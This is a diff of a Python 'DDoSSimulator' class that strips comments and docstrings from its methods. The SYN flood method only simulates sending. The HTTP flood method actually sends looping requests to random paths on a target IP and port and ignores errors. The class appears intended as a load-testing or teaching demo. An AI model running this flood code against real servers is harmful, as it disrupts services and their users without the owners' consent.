@@ -75,31 +75,26 @@ class DDoSSimulator:
     def syn_flood(self, thread_id):
         
         try:
-            # Raw socket for crafting custom TCP packets
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
         except socket.error as e:
             print(f"Socket error: {e}")
             print("Note: SYN flood requires root/admin privileges")
             return
-            
-        # Simplified version - in real testing, would need to craft proper TCP packets
+
         print("SYN flood requires packet crafting which is simplified in this demo")
         print(f"Thread {thread_id} would be sending SYN packets to {self.target_ip}:{self.target_port}")
-        
-        # Simulate sending instead of actual implementation
+ 
         while self.attack_running:
             self.packets_sent += 1
             time.sleep(0.01)
     
     def http_flood(self, thread_id):
-        """Send HTTP requests (HTTP flood)"""
+ 
         import requests
         from requests.exceptions import RequestException
         
-        # List of random URLs to request
         paths = ["/", "/api", "/data", "/metrics", "/status", "/config", "/dashboard"]
         
-        # Send requests
         while self.attack_running:
             try:
                 url = f"http://{self.target_ip}:{self.target_port}{random.choice(paths)}"
@@ -109,14 +104,14 @@ class DDoSSimulator:
                 # Small delay
                 time.sleep(0.2)
             except RequestException:
-                # Ignore errors, just continue flooding
+
                 self.packets_sent += 1
             except Exception as e:
                 print(f"Error in HTTP flood thread {thread_id}: {e}")
                 time.sleep(0.2)
     
     def start_attack(self):
-        """Start the DDoS attack simulation"""
+
         if self.attack_running:
             print("Attack already running")
             return
@@ -159,7 +154,6 @@ class DDoSSimulator:
         for t in threads:
             t.join(timeout=2)
             
-        # Print summary
         duration = (self.end_time - self.start_time).total_seconds()
         rate = self.packets_sent / duration if duration > 0 else 0
         print("\nAttack completed!")
